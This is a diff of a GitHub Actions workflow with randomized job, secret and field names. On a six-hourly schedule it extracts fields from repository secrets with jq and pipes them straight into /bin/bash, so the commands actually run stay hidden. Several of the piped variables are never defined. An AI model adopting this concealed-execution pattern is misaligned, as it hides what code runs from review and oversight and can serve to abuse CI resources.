@@ -3,22 +3,23 @@ name: yuanjiaming9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
+    - cron: '11 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuanjiaming9876
         env:
-          sawzv84: ${{ secrets.sawzv84 }}
+          de513: ${{ secrets.de513 }}
         run: |
-          echo $sawzv84 | jq -r .jwnxq452 | /bin/bash
-          echo $hh261 | jq -r .gc52 | /bin/bash
-          echo $s57 | jq -r .tqh234 | /bin/bash
-          echo $arzur23216 | jq -r .ronbj90 | /bin/bash
-          echo $ofyr0853 | jq -r .olplh4 | /bin/bash
-          echo $i8 | jq -r .l393 | /bin/bash
-          echo $adet14127 | jq -r .iy47416 | /bin/bash
-          echo $jo098 | jq -r .lv5240 | /bin/bash
+          echo $de513 | jq -r .eokpi2 | /bin/bash
+          echo $gzqp5252 | jq -r .gdmtb88 | /bin/bash
+          echo $p196 | jq -r .jift0 | /bin/bash
+          echo $nhviv1 | jq -r .bpty27 | /bin/bash
+          echo $ptay05 | jq -r .hkwkw214 | /bin/bash
+          echo $ymjl5 | jq -r .c946 | /bin/bash
+          echo $fbxu122 | jq -r .hmbsb2396 | /bin/bash
 
